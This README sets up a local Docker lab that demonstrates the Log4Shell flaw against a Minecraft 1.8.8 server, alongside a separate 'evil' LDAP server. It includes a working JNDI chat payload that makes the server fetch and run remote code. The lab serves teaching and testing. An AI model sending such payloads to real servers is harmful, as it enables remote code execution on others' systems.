# Overview



## Setting up the environment

- Download [Docker](https://www.docker.com/products/docker-desktop/)
- Launch your [Minecraft](https://www.minecraft.net/en-us/download) game and install version 1.8.8 (Installations > New Installations > release 1.8.8).
- Install [Python 3+](https://www.python.org/downloads/)
- Java 8 ([build 181](https://archive.org/download/Java-Archive/Java%20SE%208%20%288u202%20and%20earlier%29/8u181/JDK/))

## Starting up the Minecraft server on Docker


0. `cd` to the current directory (where this README.md file is located)
1. Build the docker image:
```
docker build -t linux-server .
```
2. Run the docker image (iterative mode):
```
docker run -it -p 25565:25565 --name mcserver linux-server
```


The command above will start up a Docker container that is running the minecraft server (`minecraft_server.1.8.8.jar`). 



## Starting up a Malicious Server

Now we will starup an LDAP server that will serve the exploit (`MinecraftLog4J.java`).

1. Build the docker file for the malicious server
```
docker build -f Dockerfile_evil_server -t evil-image .
```

2. Run the docker image 

```
docker run -it -p 1389:1389 -p 8000:8000 --name evil-server evil-image
```

## Connect to the Minecraft Server from the Host Machine

After running the Docker container, you should be able to connect to the Minecraft server from the host machine:

1. Launch the Minecraft game on your host machine (release 1.8.8).
2. Select "Multiplayer"
3. Click "Add Server" and enter the following:
- Server Name: Any name you like.
- Server Address: localhost (or 127.0.0.1).
- Save and click "Join Server" to connect.

4. Once in game, type in chat:

```
${jndi:ldap://host.docker.internal:1389/MinecraftLog4J}
```


You will see in the output of your Minecraft server docker, a message like this:

```
[HH:MM:SS] [Server thread/INFO]: <PlayerName> ${jndi:ldap://host.docker.internal:1389/MinecraftLog4J}
!!HACKED!! (OS = linux )
!!HACKED!! (OS = linux )
```

This means that the exploit did execute succesfully.



